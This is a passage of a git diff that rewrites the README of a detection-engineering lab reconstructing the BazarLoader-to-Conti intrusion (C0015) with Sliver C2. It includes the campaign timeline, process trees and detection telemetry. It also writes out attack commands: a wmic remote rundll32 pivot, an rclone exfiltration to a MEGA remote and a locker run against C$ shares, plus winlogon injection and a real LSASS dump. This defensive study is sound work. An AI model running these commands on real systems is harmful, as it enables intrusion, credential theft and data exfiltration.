@@ -1,365 +1,522 @@
-# C0015 Detection Engineering Lab
+# C0015 — BazarLoader to Conti, reconstructed for detection engineering
 
-An evidence-driven reconstruction of [MITRE ATT&CK Campaign C0015](https://attack.mitre.org/campaigns/C0015/),
-based on [The DFIR Report: CONTInuing the Bazar Ransomware Story](https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/)
-(29 November 2021). The project studies how an intrusion becomes observable, how detection rules respond,
-and how each conclusion can be traced to a recorded lab run.
+![ATT&CK](https://img.shields.io/badge/ATT%26CK-30%20techniques%20mapped-informational)
+![techniques](https://img.shields.io/badge/techniques-14-blue)
+![Sigma](https://img.shields.io/badge/Sigma-20%20rules-green)
+![Suricata](https://img.shields.io/badge/Suricata-5%20signatures-orange)
+![YARA](https://img.shields.io/badge/YARA-1%20rule-red)
+![License](https://img.shields.io/badge/license-MIT-lightgrey)
 
-The homelab combines Windows/Active Directory telemetry, benign payload surrogates, an internal C2
-simulator, and Elastic Security. It follows the entry, discovery, lateral movement, collection, transfer,
-remote-access, and impact portions of the campaign. Historical behavior, lab substitutions, and evidence
-limitations are kept separate.
+Between 2 and 6 August 2021, an operator entered a corporate network through a weaponised Word
+document, moved a beacon into `winlogon.exe`, pivoted to a backup server through WMI, exfiltrated data
+to MEGA with `rclone` over two evenings, and encrypted the estate with Conti from a batch file. The
+DFIR Report published the case as C0015. This repository reconstructs the campaign as an instrumented
+lab: three Windows hosts on a host-only segment, a Sliver C2 that replaces Cobalt Strike, the same
+process ancestry and the same command lines, and a detection suite that maps each stage to the
+telemetry it leaves behind.
 
-**Project scope:** campaign stages S1–S14, followed by validation and recovery. S6 target-manifest
-orchestration was not executed in the recorded runs; S15 is post-run validation, not campaign behavior.
+The purpose of the reconstruction is narrow. Every technique in the campaign is reproduced with real
+tooling rather than with a signature stub, so the resulting events are the events a real detection
+stack would receive: cross-process thread creation into a system process, a service host spawning a
+module loader, a provider host spawning a loader through WMI, a cloud transfer with throttling flags,
+a locker binary invoked with a fixed argument set. The rules in this repository were written against
+those events and are stored beside the technique that produces them.
 
-**Detection suite:** 24 rules — 23 EQL rules and one KQL threshold rule. R17, R18, and R23 are
-high-severity alerting rules; the other 21 are building blocks.
+## Table of contents
 
-## Start here
+- [The original campaign](#the-original-campaign)
+  - [Timeline](#timeline)
+  - [Process ancestry](#process-ancestry)
+  - [Technically significant behaviour](#technically-significant-behaviour)
+  - [What the report does not establish](#what-the-report-does-not-establish)
+- [The lab](#the-lab)
+  - [Delivery and proxy execution](#delivery-and-proxy-execution)
+  - [Stage hosting and the dead fallback](#stage-hosting-and-the-dead-fallback)
+  - [Injection into winlogon](#injection-into-winlogon)
+  - [Discovery and share enumeration](#discovery-and-share-enumeration)
+  - [Lateral movement to the backup server](#lateral-movement-to-the-backup-server)
+  - [Injection into the service host](#injection-into-the-service-host)
+  - [Interactive access to the backup server](#interactive-access-to-the-backup-server)
+  - [Collection and exfiltration](#collection-and-exfiltration)
+  - [Impact](#impact)
+  - [Lab process ancestry](#lab-process-ancestry)
+- [Repository structure](#repository-structure)
+- [Detection opportunities](#detection-opportunities)
+- [How to run the lab](#how-to-run-the-lab)
+- [Credits and references](#credits-and-references)
 
-1. [Reference run RUN-20261002-07](reports/reference-run-20261002-07.md) — observed chain, detection
-   results, activity counts, and recovery.
-2. [Run-07 ledger](evidence/runs/RUN-20261002-07/RUN-20261002-07.json) and
-   [artifacts](evidence/runs/RUN-20261002-07/) — event references, transfer receipts, and verification outputs.
-3. [Detection queries](detections/queries/) and [import bundles](detections/exports/) — the implemented
-   predicates and their exported configuration. The [detection catalogue](detections/README.md) provides
-   investigation context.
-4. [Operator runbook](docs/attack-runbook.md) — the documented lab procedure, evidence collection, and
-   cleanup.
+## The original campaign
 
-RUN-07 is the evidence reference used in this README. [RUN-08](reports/reference-run-20261002-08.md)
-carries full provenance in its ledger (real event ids/timestamps). The latest replay is
-[RUN-20261002-09](reports/reference-run-20261002-09.md), which adds S6 target-selection
-orchestration and S12 interactive-logon session evidence.
+### Timeline
 
-## Project architecture and workflow
+**Day 1.** A password-protected archive delivered by phishing contains a document named
+`decree-08.03.2021.doc`. The file extension says Word 97-2003; the content is Word 2003 XML with an
+embedded VBA project. The document asks the user to enable macros. Once enabled, the macro writes an
+HTML Application, `compareforfor.hta`, into the user profile and starts it.
+
+`mshta.exe` runs the HTA. The script mixes VBScript and JScript, decodes a base64 blob, and issues an
+HTTP GET to `millscruelg[.]com` with query parameters shaped like a search result. The response is
+written to `C:\Users\Public\compareForfor.jpg` and executed with `regsvr32.exe`. The file is a DLL; the
+extension is an image.
+
+The module is BazarLoader. It calls `64.227.65[.]60:443`, spawns `svchost.exe`, and queries
+`myexternalip[.]com` for the network's public address. Two Cobalt Strike DLLs are then loaded through
+`rundll32.exe` with `svchost.exe` as the parent. `D574.dll` never reaches its infrastructure: it
+queries `volga.azureedge[.]net` repeatedly and receives a non-existent name. `D8B3.dll` connects to
+`82.117.252.143` on port 80 and 443, using a Let's Encrypt certificate for `checkauj.com` and a
+malleable profile whose GET and POST URIs are `/jquery-3.3.1.min.js` and `/jquery-3.3.2.min.js`. The
+beacon sleeps sixty seconds with thirty-seven percent jitter.
+
+`D8B3.dll` then allocates memory in `winlogon.exe` and creates a thread there. From that moment the
+operator works inside a SYSTEM process. Discovery follows within the same hour: `tasklist /s`,
+`net group "domain admins" /dom`, `net localgroup "administrator"`,
+`nltest /domain_trusts /all_trusts`, `net view /all /domain`, per-host `net view \\host /all`, `ping`,
+and `time`, each as its own `cmd.exe /C` invocation. `AdFind` is written to disk and never executed.
+
+Share enumeration runs `Invoke-ShareFinder` through a download cradle and writes
+`C:\ProgramData\found_shares.txt`. The file is created by the beacon process, not by PowerShell.
+
+At 18:43 the operator pivots to the backup server:
+
+```
+cmd.exe /C wmic /node:<backup server> process call create "rundll32.exe C:\ProgramData\143.dll DllRegisterServer"
+```
+
+The DLL was written to `C:\ProgramData` first. On the target, `WmiPrvSE.exe` creates `rundll32.exe`,
+which loads `143.dll` and calls the export. That beacon moves into
+`svchost.exe -k UnistackSvcGroup -s CDPUserSvc`, the per-user service host. The first `rclone` round
+starts at 19:45 and runs for about three hours against `Mega:DATA`.
+
+**Day 2.** The operator connects to the backup server over RDP and opens the backup console. Task
+Manager is started from the desktop; the resulting command line carries `/4`, the argument the GUI
+passes when the Performance tab is opened.
+
+**Day 4.** A second `rclone` round runs in the same evening window, reusing `--ignore-existing` so only
+new files are transferred.
+
+**Day 5.** A ping sweep establishes which hosts are reachable. AnyDesk is dropped into
+`c:\users\<user>\Videos\` and started. ProcessHacker is placed in the root of `C:` and used against
+`lsass.exe`; the report states the access as likely and does not confirm a dump. A batch file,
+`locker.bat`, is then executed from the backup server. For each host it starts a locker binary against
+the administrative share:
+
+```
+C:\<random>_locker.exe -m -net -size 10 -nomutex -p \\<TARGET>\C$
+```
+
+Encryption proceeds per host. A `readme.txt` is written into every affected directory. The operator
+closes the run by listing `\\<TARGET>\C$` to confirm the result.
+
+### Process ancestry
 
 ```mermaid
 flowchart TD
+    W["WINWORD.EXE<br/>decree-08.03.2021.doc"] --> C["cmd.exe /c mshta"]
+    C --> H["mshta.exe<br/>compareforfor.hta"]
+    H --> R["regsvr32.exe<br/>C:\\Users\\Public\\compareForfor.jpg"]
+    R --> S1["svchost.exe<br/>(loader host)"]
+    S1 --> D1["rundll32.exe D574.dll<br/>DNS only, no connection"]
+    S1 --> D2["rundll32.exe D8B3.dll<br/>main beacon"]
 
-subgraph campaign["Campaign simulation · S1–S14"]
-    direction TD
+    D2 -->|"thread in SYSTEM process"| WL["winlogon.exe"]
+    WL --> D3["cmd.exe /C discovery"]
+    WL --> P["powershell.exe<br/>Invoke-ShareFinder"]
+    WL --> WM["cmd.exe /C wmic /node:FS01"]
 
-    operator(("Lab operator"))
-    c2["C2-SIM · Operator tasks and callbacks"]
-
-    subgraph ws01["WS01 · Initial foothold"]
-        direction TD
-        entry["Word macro → HTA bootstrap"]
-        proxy["Bootstrap DLL · regsvr32"]
-        beacon1["Session 1 · PowerShell beacon"]
-        local["Discovery and LSASS surrogate"]
-
-        entry --> proxy --> beacon1 --> local
-    end
-
-    subgraph fs01["FS01 · Lateral movement"]
-        direction TD
-        pivot["SMB staging → WMI execution"]
-        beacon2["Session 2 · PowerShell beacon"]
-
-        pivot --> beacon2
-    end
-
-    subgraph later["Later operator sessions"]
-        direction TD
-        collection["File collection"]
-        transfer["rclone → WebDAV lab sink"]
-        remote["RDP and portable remote-access tools"]
-        impact["Bounded impact simulation"]
-
-        collection --> transfer
-        remote --> impact
-    end
-
-    dc01["DC01 · AD DS and DNS"]
-
-    operator -->|"opens document"| entry
-    operator -->|"controls sessions"| c2
-    c2 <-->|"tasks and callbacks"| beacon1
-    c2 <-->|"tasks and callbacks"| beacon2
-
-    local -->|"operator-driven pivot"| pivot
-    beacon2 -->|"operator collection task"| collection
-    operator -->|"interactive access"| remote
-
-    dc01 -.->|"domain services"| ws01
-    dc01 -.->|"domain services"| fs01
-end
-
-subgraph detection["Telemetry and detection"]
-    direction TD
-
-    sensors["Sysmon and Windows event logs"]
-    agents["Elastic Agent · WS01 and FS01"]
-    fleet["Fleet · Agent policies"]
-    elastic[("Elasticsearch · Raw events")]
-    queries["Version-controlled detection queries"]
-    exports["NDJSON rule exports"]
-    rules["Elastic Security · Rules and alerts"]
-
-    sensors -->|"collect"| agents
-    fleet -.->|"manages"| agents
-    agents -->|"ingest"| elastic
-    queries -->|"generate"| exports
-    exports -->|"import"| rules
-    elastic -->|"evaluate"| rules
-end
-
-subgraph evidence["Evidence and validation"]
-    direction TD
-
-    artifacts["Artifacts, manifests and sink receipts"]
-    ledger[("Run evidence ledger")]
-    report["Acceptance findings and reference report"]
-
-    artifacts -->|"paths and hashes"| ledger
-    ledger -->|"supports conclusions"| report
-end
-
-ws01 -.->|"host telemetry"| sensors
-fs01 -.->|"host telemetry"| sensors
-
-transfer -->|"per-file receipts"| artifacts
-impact -->|"verify and rollback results"| artifacts
-elastic -->|"event IDs, fields and UTC timestamps"| ledger
-rules -->|"alert references"| ledger
-
-classDef execution fill:#dbeafe,stroke:#2563eb,stroke-width:1.5px,color:#172554
-classDef operations fill:#fef3c7,stroke:#d97706,stroke-width:1.5px,color:#78350f
-classDef telemetry fill:#dcfce7,stroke:#16a34a,stroke-width:1.5px,color:#14532d
-classDef evidenceTone fill:#ffe4e6,stroke:#e11d48,stroke-width:1.5px,color:#881337
-classDef infrastructure fill:#e0e7ff,stroke:#4f46e5,stroke-width:1.5px,color:#312e81
-
-class entry,proxy,beacon1,beacon2 execution
-class local,pivot,collection,transfer,remote,impact operations
-class sensors,agents,fleet,elastic,queries,exports,rules telemetry
-class artifacts,ledger,report evidenceTone
-class operator,c2,dc01 infrastructure
-
-style campaign fill:none,stroke:none,color:#c9d1d9
-style ws01 fill:#eff6ff,stroke:#93c5fd,color:#172554
-style fs01 fill:#eff6ff,stroke:#93c5fd,color:#172554
-style later fill:#fffbeb,stroke:#fcd34d,color:#78350f
-style detection fill:none,stroke:none,color:#c9d1d9
-style evidence fill:none,stroke:none,color:#c9d1d9
+    WM -->|"remote process creation"| WP["WmiPrvSE.exe<br/>on backup server"]
+    WP --> R2["rundll32.exe<br/>C:\\ProgramData\\143.dll DllRegisterServer"]
+    R2 -->|"thread in service host"| SV["svchost.exe<br/>-k UnistackSvcGroup -s CDPUserSvc"]
+    SV --> RDP["TCP 3389<br/>RDP through the implant"]
+    SV --> RC["rclone.exe<br/>Mega:DATA"]
+    SV --> LK["cmd.exe /c locker.bat"]
+    LK --> EX["&lt;random&gt;_locker.exe -m -net -size 10 -nomutex -p \\\\HOST\\C$"]
 ```
 
-Fleet manages endpoint policies; Elastic Agents send telemetry to Elasticsearch, where Elastic Security
-evaluates the rules. Event references and lab artifacts are recorded together in the run ledger.
+### Technically significant behaviour
 
-| System | Role | Lab address / purpose |
-|---|---|---|
-| WS01 | Windows 10 initial workstation | `192.168.50.20`; document entry, session 1, operator tooling |
-| FS01 | Windows 10 Pro file server / target | `192.168.50.30`; Finance/IT shares, WMI pivot, session 2, impact corpus |
-| DC01 | AD DS and DNS for `c0015.lab` | `192.168.50.10`; domain infrastructure, no interactive operator use |
-| Windows C2 host | Operator and internal services | `192.168.50.1`; HTTP staging `:8000`, C2-SIM `:8080`, WebDAV sink `:9001` |
-| Kali | Auxiliary tooling and telemetry routing | `192.168.50.100`; Tailscale routing to the Elastic backend |
-| ELASTIC01 | Elasticsearch, Kibana, Fleet Server | Tailscale `100.77.46.126`; endpoint policy `C0015-Windows-Endpoints` |
+**The handoff from loader to beacon.** BazarLoader is not the tool the operator uses. It exists to
+place a second loader host and start the Cobalt Strike DLLs. The observable is a `svchost.exe` whose
+children are `rundll32.exe` processes, one of which fails and one of which becomes the primary channel.
 
-Domain traffic uses VMware VMnet2 (`192.168.50.0/24`, host-only, DHCP disabled). WS01 and FS01 also
-have NAT adapters for installers and updates. Endpoint events use namespace `c0015`; the rule bundles
-target `logs-windows.sysmon_operational-c0015*` and `logs-system.security-c0015*`.
+**Injection into `winlogon.exe`.** The beacon does not remain in the process that loaded it. Moving
+into the logon process converts a user-level foothold into SYSTEM and changes the parent of every
+subsequent command. This single step is what makes the discovery, the WMI pivot, and the RDP session
+look the way they do.
 
-## Recorded results
+**WMI as the pivot primitive.** `wmic process call create` with a `/node:` argument is a remote
+execution path that needs no service installation and no file copy through a service manager. The
+target-side observable is `WmiPrvSE.exe` spawning the loader. It is not WMI event subscription; no
+filter, consumer, or binding is created.
 
-The following results come from RUN-07 and its committed evidence. They describe the lab replay,
-not execution of the original Bazar/Conti malware.
+**Injection into the per-user service host.** `CDPUserSvc` runs as the logged-on user, so the second
+injection needs no privilege escalation. The host choice determines the network attribution: the
+callback and the RDP socket belong to `svchost.exe`.
 
-| Area | Recorded outcome | Evidence |
-|---|---|---|
-| Entry and session 1 | The Word macro writes the bootstrap files; WINWORD → mshta → regsvr32 leads to beacon registration | S1–S3 ledger; entity joins and C2 registration |
-| Discovery and identity | Discovery/share-enumeration tasks and administrative context; LSASS surrogate access mask `0x1010` | S4–S7b; Sysmon E1/E10 and Security events; no credential extraction claim |
-| Lateral movement and session 2 | SMB staging followed by WMI-spawned rundll32, an unsigned module load, and the FS01 callback | S8a–S9; Security 5145, Sysmon E1/E7/E3, ART-07-01 |
-| Collection and transfer | 11 files / 309 bytes; two rclone rounds with 11/11 name, size, and hash equality in each receipt | ART-08-01 manifest and two ART-09-01 receipts |
-| RDP | Type-10 interactive logon on FS01 at `09:03:26.968Z`; R19 alerts recorded at `09:03:38Z` | S12 event `AaD72qiPmO7CP6S6j0bF` and archived alert references |
-| Remote tools | AnyDesk drop followed by execution; ProcessHacker drop observed | S13 E11/E1 references |
-| Bounded impact and recovery | 15-file surrogate run; 30 bidirectional verification mismatches after impact, then rollback and hash equality | ART-14-01 JSON summary and console output |
-| Detection | R17: 3 stored docs / 1 sequence; R18: 6 docs / 2 activities; R23: 1 alert; R19: 2 docs / 1 Type-10 logon | Reference report and run ledger |
+**Cloud exfiltration with throttling.** `rclone` against a MEGA remote, with a bandwidth ceiling and
+seven parallel transfers, twice, in the same evening window. The ceiling keeps the transfer below
+saturation, which is why it survives for hours without drawing attention.
 
-Stored alert documents are not incident counts. Look-back overlap, polling, and suppression affect volume;
-activity counts are only reported where the run report establishes them.
+**Impact from the backup server.** The batch file runs on the backup server and targets
+`\\HOST\C$` for each host. The DC is not part of the target list.
 
-### Recorded runs
+### What the report does not establish
 
-| Run | Role in this repository | Report / ledger |
-|---|---|---|
-| RUN-20261002-05 | Initial recorded run; R19 rule coverage began after its Type-10 events; impact verification used the earlier one-directional implementation | [Report](reports/reference-run-20261002-05.md) · [Ledger](evidence/runs/RUN-20261002-05/RUN-20261002-05.json) |
-| RUN-20261002-06 | Replay with R19 positive and bidirectional impact verification | [Report](reports/reference-run-20261002-06.md) · [Ledger](evidence/runs/RUN-20261002-06/RUN-20261002-06.json) |
-| RUN-20261002-07 | Evidence reference for this README; tuned rules and R22/R23/R24 coverage | [Report](reports/reference-run-20261002-07.md) · [Ledger](evidence/runs/RUN-20261002-07/RUN-20261002-07.json) |
-| RUN-20261002-09 | **Latest recorded replay**; S6 orchestration executed + S12 T10/session captured | [Report](reports/reference-run-20261002-09.md) · [Ledger](evidence/runs/RUN-20261002-09/RUN-20261002-09.json) |
+Two points are unresolved. The credential used for the WMI pivot has no documented origin: no LSASS
+access is recorded before the pivot, and no credential material appears in the report. And the
+ProcessHacker step is described as likely LSASS access rather than a confirmed dump.
 
-All four committed scorecards record `ACCEPTED`. This means that the configured acceptance assertions
-passed at verification time. It does not mean that every planned stage ran, every telemetry field was
-populated, or every RDP session was fully characterized.
+The lab does not attempt to invent either. It provisions the pivot credential explicitly and records
+that provisioning as a lab step, and it performs the LSASS dump for real so that the access mask, the
+dump file, and the offline parsing are all observable. Both choices are stated in the technique
+folders rather than presented as campaign evidence.
 
-## Campaign behavior and detection coverage
+## The lab
 
-| Stage | Behavior represented in the lab | Telemetry / evidence | Rules |
-|---|---|---|---|
-| S1 | Word macro entry and script/proxy handoff | E1 parent/entity chain; E11 bootstrap writes | R01–R08 |
-| S2–S3 | HTA/DLL bootstrap and session-1 callback | E1/E3/E7; markers and C2 registration | R05/R06/R09/R18 |
-| S4–S5 | Discovery and share enumeration | E1 command/process ancestry | R10–R13 |
-| S6 | Target-manifest orchestration | NOT RUN in RUN-05..08 (explicit); **EXECUTED in RUN-20261002-09** (decision artifact `ART-06-02-RUN09`, fixed scenario target FS01) | coverage claim = decision executed; NOT discovery-driven selection |
-| S7 | Authentication and privileged logon context | Security 4624/4672; same-host logon IDs | R14a/R14b |
-| S7b | LSASS-access surrogate | E10 process access; no extraction inferred | R15 |
-| S8a | SMB admin-share handoff | Security 5145 and target-side E11 | R16 |
-| S8b | WMI-spawned proxy loading an unsigned DLL | E1 → E7 on the same process entity | R17 |
-| S9 | FS01 session-2 beacon callback | Entity-owned E3 and ART-07-01 receipt | R18/R09 |
-| S10 | UNC collection and staging | E11, Security 5145, ART-08-01 manifest | R16 covers admin shares; Finance/IT reads require analyst review |
-| S11a/b | rclone transfer to an internal WebDAV sink | E1 → E3 and per-file ART-09-01 receipts | R24 |
-| S12 | RDP interactive logon | Security 4624 Type 10; R19 references | R19 |
-| S13 | Portable remote-access/process tools | E11 drop and E1 execution | R20 |
-| S14 | Reversible impact surrogate and note spread | E11; ART-14-01 verification and rollback | R22/R23 |
+The estate is three Windows hosts and one Linux host. DC01 provides AD DS and DNS. WS01 is the victim
+workstation. FS01 is the backup server: the lateral target, the origin of the second beacon, the source
+of the exfiltrated data, and the host that runs the impact batch file. The Linux host runs the C2 and
+the staging services. The campaign separates the backup server from the data server; with a single
+server in the estate, the lab consolidates both roles and keeps the transfer command, the remote name,
+and the destination service unchanged.
 
-The initial bootstrap DLL is `c0015-comparefor.jpg`, built from
-[payloads/dll/c0015_bootstrap_dll.c](payloads/dll/c0015_bootstrap_dll.c).
-The separate `c0015_143_surrogate.dll` belongs to the FS01 lateral-movement stage.
-The [historical mapping and fidelity notes](docs/attack-chain-plan.md) describe the source campaign and
-which behaviors are inferred or replaced by lab surrogates.
+Sliver replaces Cobalt Strike. The implants are Go builds with an exported `DllRegisterServer`, so the
+module that `regsvr32` and `rundll32` load has the same properties as the campaign DLLs: unsigned, no
+version metadata, loaded by a signed Windows binary from a user-writable directory.
 
-## Detection engineering
+### Delivery and proxy execution
 
-The suite uses behavioral process ancestry, module signature/path context, logon fields, file creation,
-and process-owned network connections. Detection predicates avoid hardcoded lab IPs, hostnames, and
-accounts; index patterns and ingest mappings remain specific to this lab.
+The delivery document carries the second stage as base64 and writes it at open time. The macro starts
+`cmd.exe /c mshta`, which yields the three-level edge `WINWORD.EXE -> cmd.exe -> mshta.exe`. The HTA
+keeps the three COM objects of the campaign — `MSXML2.XMLHTTP`, `ADODB.Stream`, and `WScript.Shell` —
+downloads the module to `C:\Users\Public`, and registers it with `regsvr32`.
 
-| Rule group | Purpose |
-|---|---|
-| R01–R08 | Office/script/proxy execution and staging |
-| R09 | Proxy-spawned PowerShell network activity |
-| R10–R13 | Discovery ancestry and share enumeration |
-| R14a/R14b/R15 | Authentication, privileged context, and LSASS access |
-| R16–R18 | Admin-share access, WMI pivot, and proxy-spawned egress |
-| R19/R20 | RDP and portable remote-access/process tools |
-| R22/R23 | Potential impact-note creation and same-process note spread |
-| R24 | Transfer-tool process egress |
+Telemetry: process creation for the chain, file creation for the HTA and the module, and a module load
+from a user-writable path with no valid signature.
 
-**Alerting rules:** R17 (WMI-spawned unsigned module), R18 (proxy-spawned PowerShell egress), and
-R23 (note spread across distinct paths). **Building blocks:** the remaining 21 rules.
+- [`techniques/macro-document-delivery/`](techniques/macro-document-delivery/)
+- [`techniques/hta-proxy-execution/`](techniques/hta-proxy-execution/)
+- [`techniques/regsvr32-module-execution/`](techniques/regsvr32-module-execution/)
 
-R17 and R18 are EQL sequences; R23 is a KQL threshold rule grouped by `host.name` and
-`process.entity_id`, requiring at least three distinct `file.path` values.
-The rules evaluate raw events. Cross-rule building-block relationships are analyst correlation guidance;
-there is no claim that a campaign-level rule consumes those building-block alerts.
+### Stage hosting and the dead fallback
 
-### Import bundles
+A service DLL hosts the stage inside `svchost.exe -k c0015grp` and spawns
+`rundll32.exe C:\Users\Public\C0015\D8B3.dll`. Because the service host runs as SYSTEM, the loader
+inherits SYSTEM without a separate privilege operation, and the process tree contains the campaign
+edge. The service installation adds events the source intrusion does not contain — a service
+installation record and the service registry keys — and those are the price of reproducing the host
+process without a real loader.
 
-- [c0015-rules-r01-r11.ndjson](detections/exports/c0015-rules-r01-r11.ndjson) — 11 rules.
-- [c0015-rules-r12-r24.ndjson](detections/exports/c0015-rules-r12-r24.ndjson) — 13 rules, including
-  R14a/R14b and R22–R24. R21 is retired.
+A second module is generated against a name that does not resolve in the lab zone. It retries, the
+lookups fail, and no connection is established, which reproduces the fallback that never reached its
+infrastructure.
 
-The generator is [scripts/rules/gen_rules_ndjson.ps1](scripts/rules/gen_rules_ndjson.ps1).
-It rejects empty queries and duplicate rule IDs. IDs are derived from rule names; a rename changes the ID
-and requires migration rather than assuming the old server-side rule is overwritten.
+Telemetry: service installation, registry writes for `ServiceDll` and the service group, the
+`svchost.exe -> rundll32.exe` edge, and repeated DNS lookups returning a non-existent name.
 
-The exported schedule is one minute, with a six-minute EQL look-back and a ten-minute R23 threshold
-window. Suppression is configured for selected rules; its presence alone does not establish a measured
-reduction in unique activity.
+- [`techniques/bazar-svchost-stage/`](techniques/bazar-svchost-stage/)
 
-## Evidence and verification
+### Injection into winlogon
 
-Each [run directory](evidence/runs/) contains a ledger, an artifact index, manifests, receipts, and
-verification outputs. The public repository records selected evidence and event references; it is not
-a complete export of the Elasticsearch telemetry.
+From the loader session running as SYSTEM, the implant migrates into `winlogon.exe`. The migration
+builds a new implant from the active configuration, so the session keeps its C2 profile and callback
+interval while its host process becomes the logon process. The original session is retained as a
+fallback until the new one has executed a command.
 
-Artifact-file SHA-256 values use CRLF → LF normalization, as documented by the verifier. Transfer
-receipts separately record observed payload-file names, sizes, and SHA-256 values for comparison with
-the collection manifest. Artifact hash integrity and event-reference completeness are distinct checks.
+Telemetry: a cross-process thread creation whose source is `rundll32.exe` and whose target is
+`winlogon.exe`; a handle request against `winlogon.exe` with rights that permit memory writes; and,
+afterwards, `cmd.exe` or `powershell.exe` with `winlogon.exe` as the parent and `NT AUTHORITY\SYSTEM`
+as the user.
 
-### Offline component tests
+- [`techniques/winlogon-injection/`](techniques/winlogon-injection/)
 
-From the repository root:
+### Discovery and share enumeration
 
-```bash
-python -m unittest discover -s scripts/tests
+Discovery runs one command per process from the winlogon session, so the parent image stays
+`winlogon.exe` and each shell is short-lived. Share enumeration uses the same cradle shape as the
+campaign: an `IEX` download of PowerView, `Invoke-ShareFinder -CheckShareAccess -Verbose`, and output
+written as ASCII to `C:\ProgramData\found_shares.txt`.
+
+The lab AD is populated with enough users, groups, and shares for the enumeration to return a usable
+map; an empty directory would make the target-selection step impossible to exercise.
+
+Telemetry: `winlogon.exe` as the parent of `cmd.exe`, one process per command; the PowerShell command
+line containing both a download cradle and the function name; script block logging with the same
+content; and the file creation for the enumeration output.
+
+- [`techniques/lolbin-discovery/`](techniques/lolbin-discovery/)
+- [`techniques/share-enumeration/`](techniques/share-enumeration/)
+
+### Lateral movement to the backup server
+
+The pivot beacon is written to `\\FS01\C$\ProgramData\143.dll` over SMB, then created through WMI from
+a `cmd.exe` that was started by `winlogon.exe`:
+
+```
+cmd.exe /C wmic /node:FS01 process call create "rundll32.exe C:\ProgramData\143.dll DllRegisterServer"
 ```
 
-The current suite contains 20 tests for artifact/manifest/receipt handling, fixtures, and C2-SIM logic.
-These are component tests; they do not execute EQL in Elastic or prove a live campaign replay.
+`wmic process call create` splits its argument on commas. The comma form returns `ReturnValue 9` and
+creates nothing; the space form above is required and is what renders in the process command line.
 
-### Acceptance against retained telemetry
+Telemetry: the source-side command line; a network logon and special-privilege assignment on the
+target; share access for the file copy; the `WmiPrvSE.exe -> rundll32.exe` edge; and the unsigned
+module load in the new process.
 
-With the documented runtime log and authorized Elastic credentials available:
+- [`techniques/wmi-remote-process-creation/`](techniques/wmi-remote-process-creation/)
 
-```bash
-python scripts/verify/verify_final_phases.py RUN-20261002-07
+### Injection into the service host
+
+The pivot beacon moves into the instance whose command line carries
+`-k UnistackSvcGroup -s CDPUserSvc`. Migration is by PID, because several service host instances run
+on the host and name resolution would land in an arbitrary one. The instance runs as the interactive
+user, so the injection needs no additional privilege.
+
+Telemetry: cross-process thread creation from `rundll32.exe` into `svchost.exe`; the module load that
+precedes it; and an outbound connection owned by the service host.
+
+- [`techniques/svchost-injection/`](techniques/svchost-injection/)
+
+### Interactive access to the backup server
+
+The implant starts a SOCKS proxy and the RDP client connects through it. The socket to port 3389 is
+therefore owned by the implant, not by a client on the operator workstation. Inside the session the
+operator opens the backup console and starts Task Manager from the desktop, which produces
+`taskmgr.exe /4` with `explorer.exe` as the parent.
+
+Telemetry: an outbound connection to 3389 from the implant process; a type 10 logon on the target with
+a workstation name that is not an estate member; and the GUI-launched Task Manager command line.
+
+- [`techniques/rdp-lateral-movement/`](techniques/rdp-lateral-movement/)
+
+### Collection and exfiltration
+
+Two transfer rounds, several days apart, in the same evening window. The command keeps the campaign
+flag set:
+
+```
+rclone.exe copy --max-age 2y "\\FS01\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M
 ```
 
-The verifier requires `ES_PASS`; `ES_URL` and `ES_USER` select the backend and account.
-It queries retained events/alerts and checks committed artifacts. Live acceptance depends on telemetry
-retention and the runtime C2 log; the recorded scorecard preserves the result from the run.
+The destination is a real MEGA account. The corpus is synthetic and sized so the transfer has the same
+shape at the same bandwidth ceiling, which is shorter than three hours but identical in command line,
+destination, and concurrency.
 
-## Known limitations
+Telemetry: the process command line; egress to the MEGA API; and the share reads that precede the
+transfer.
 
-| Item | What is established | Remaining limitation |
+- [`techniques/rclone-exfiltration/`](techniques/rclone-exfiltration/)
+
+### Impact
+
+`locker.bat` is rendered per target host and executed from the backup server. The locker binary
+accepts the campaign argument set — `-m -net -size 10 -nomutex -p \\HOST\C$` — renames files in the
+allowlisted corpus, and writes `readme.txt` into each directory it touches. No content is encrypted
+and no key material is generated; the rename and the note are the observables, and the corpus is
+restored from a hash-checked copy afterwards.
+
+Telemetry: `cmd.exe /c locker.bat` followed by the locker process and its argument list; `readme.txt`
+creation across several directories in a short window; and write access to the administrative share
+path rendered in the argument.
+
+- [`techniques/conti-style-impact/`](techniques/conti-style-impact/)
+
+### Lab process ancestry
+
+```mermaid
+flowchart TD
+    W["WINWORD.EXE"] --> C["cmd.exe /c mshta"]
+    C --> H["mshta.exe<br/>compareforfor.hta"]
+    H --> R["regsvr32.exe<br/>C:\\Users\\Public\\compareForfor.jpg"]
+    R --> SL1["Sliver implant<br/>(foothold session)"]
+
+    SV0["service c0015svc<br/>svchost.exe -k c0015grp"] --> R2["rundll32.exe<br/>D8B3.dll"]
+    R2 --> SL2["Sliver beacon<br/>(SYSTEM stage)"]
+    SL2 -->|"migrate --process-name winlogon.exe"| WL["winlogon.exe"]
+    WL --> D3["cmd.exe /C discovery"]
+    WL --> P["powershell.exe<br/>Invoke-ShareFinder"]
+    WL --> WM["cmd.exe /C wmic /node:FS01"]
+
+    WM -->|"remote process creation"| WP["WmiPrvSE.exe<br/>on FS01"]
+    WP --> R3["rundll32.exe<br/>C:\\ProgramData\\143.dll DllRegisterServer"]
+    R3 --> SL3["Sliver beacon<br/>(pivot session)"]
+    SL3 -->|"migrate --pid CDPUserSvc"| SV["svchost.exe<br/>-k UnistackSvcGroup -s CDPUserSvc"]
+    SV --> RDP["TCP 3389<br/>xfreerdp via SOCKS"]
+    SV --> RC["rclone.exe<br/>Mega:DATA"]
+    SV --> LK["cmd.exe /c locker.bat"]
+    LK --> EX["locker_sim.exe -m -net -size 10 -nomutex -p \\\\HOST\\C$"]
+```
+
+## Repository structure
+
+```
+C0015-detection-engineering-lab/
+├── README.md
+├── CREDITS.md
+├── LICENSE
+├── detections/                  cross-technique rules
+│   ├── sigma/                   one rule that spans two stages
+│   ├── suricata/                jQuery profile, certificate subject, MEGA API
+│   └── yara/                    Go beacon module
+├── docs/                        topology, run order, ATT&CK coverage
+├── infra/                       hosts, accounts, DNS design, C2 layout, Sysmon profiles
+│   ├── c2/                      listeners, nginx front, implant generation
+│   ├── dns/                     zone design
+│   ├── scripts/                 account and share provisioning
+│   └── sysmon/                  balanced and capture profiles
+├── techniques/
+│   ├── macro-document-delivery/
